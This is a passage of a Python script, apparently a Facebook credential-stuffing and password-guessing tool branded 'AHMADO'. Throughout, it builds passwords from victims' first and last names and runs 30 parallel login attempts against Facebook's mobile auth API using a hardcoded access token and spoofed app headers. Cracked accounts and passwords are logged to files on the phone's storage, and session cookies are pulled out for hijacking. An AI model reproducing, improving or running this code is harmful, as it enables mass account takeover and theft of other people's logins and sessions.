                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                           print(cookies)
                           open('/sdcard/AHMADO-OK.txt','a').write(f'sb={ssbb};{ckkk}\n')
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;93mAHMADO-CP\033[1;91m] \033[1;93m'+acc+' \033[1;91m|\033[1;93m '+pword)
                cpacc.append(acc)
                open('/sdcard/AHMADO-CP.txt','a').write(f'{acc} | {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

    if m=='2':
        with speed(max_workers=30) as speede:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()  
      



####@-----Random-----@####
def andom():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o': 
        tpp = input(f'{oo("?")}Total Password? : ')
        totalpass.append('first')
        totalpass.append('last')
        if tpp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(tpp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/AHMADO-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mAHMADO-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = "Mozilla/5.0 (Linux; Android 9; Hisense Infinity E30 Lite Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/344.0.0.10.83;]"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": AHMAD_ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mAHMADO-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/AHMADO-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mAHMADO-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/AHMADO-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   



 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mAHMADO-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = "Mozilla/5.0 (Linux; Android 9; Hisense Infinity E30 Lite Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/344.0.0.10.83;]"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": AHMAD_ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mAHMADO-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/AHMADO-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                  print(cookies)
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mAHMADO-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/AHMADO-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

      
    for x in open('.rndm','r').read().splitlines():
    	accounts.append(x)
    
    if m=='2':
        with speed(max_workers=30) as speeed:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()


Hxw_Main()
